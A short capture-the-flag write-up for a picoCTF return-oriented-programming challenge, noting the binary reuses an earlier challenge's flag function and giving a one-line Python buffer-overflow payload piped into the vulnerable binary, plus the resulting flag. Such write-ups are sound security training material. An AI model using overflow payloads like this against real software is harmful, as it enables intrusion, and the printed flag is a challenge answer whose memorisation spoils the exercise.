Okay, this was probably a mistake, the binary has the same `flag` function as the previous challenge, so it is possible to get it with the same solution as before.

    $ python2 -c "print('A'*72+'\x8d\x02\x40'+'\x00'*5+'\x4d\x08\x40'+'\x00'*5)" | ./vuln

flag: `picoCTF{r0p_1t_d0nT_st0p_1t_e51a1ea0}`
